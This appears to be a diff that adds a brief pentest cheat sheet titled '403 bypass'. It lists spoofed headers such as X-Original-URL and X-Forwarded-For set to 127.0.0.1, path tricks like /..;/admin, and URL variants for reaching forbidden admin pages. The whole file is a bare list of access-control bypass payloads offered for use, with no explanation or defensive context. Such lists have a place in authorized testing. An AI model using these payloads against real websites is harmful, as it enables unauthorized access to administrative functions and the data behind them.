@@ -1,0 +1,17 @@
+403 bypass
+X-Orginal_URL: /admin ==> use this 
+X-Forwarded-For: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+/..;/admin
+/.;/admin
+ X-Client-IP: 127.0.0.1(or)
+ X-True-IP: 127.0.0.1(or)
+ Referer: http://site.com/admin(or)
+ http://yoursite.com/admin.json
+ http://yoursite.com/admin?
+ http://yoursite.com/admin..,
+ http://yoursite.com/admin\..\.\getuser
+ http://yoursite.com/admin/
+ http://yoursite.com/admin??
+ http://yoursite.com/admin&accounyid
+ 
